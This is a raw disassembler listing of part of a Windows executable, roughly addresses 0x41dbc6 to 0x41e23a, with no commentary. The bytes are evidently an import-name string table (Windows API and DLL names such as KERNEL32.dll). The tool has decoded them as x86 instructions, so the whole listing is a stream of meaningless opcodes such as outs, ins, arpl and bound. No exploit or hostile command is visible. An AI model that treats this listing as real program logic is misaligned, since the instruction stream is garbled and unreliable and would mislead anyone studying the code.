  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
